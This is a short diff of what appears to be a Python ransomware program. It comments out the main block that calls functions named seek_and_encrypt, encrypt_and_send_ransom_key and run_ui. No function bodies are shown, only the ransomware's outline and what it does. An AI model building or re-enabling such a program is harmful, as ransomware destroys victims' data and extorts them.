@@ -151,11 +151,11 @@ def run_ui():
     root.mainloop()
 
 
-if __name__ == "__main__":
-    def main():
-        seek_and_encrypt()
-        encrypt_and_send_ransom_key()
-        run_ui()
+#if __name__ == "__main__":
+#    def main():
+#        seek_and_encrypt()
+#        encrypt_and_send_ransom_key()
+#        run_ui()
 
     
 #main()
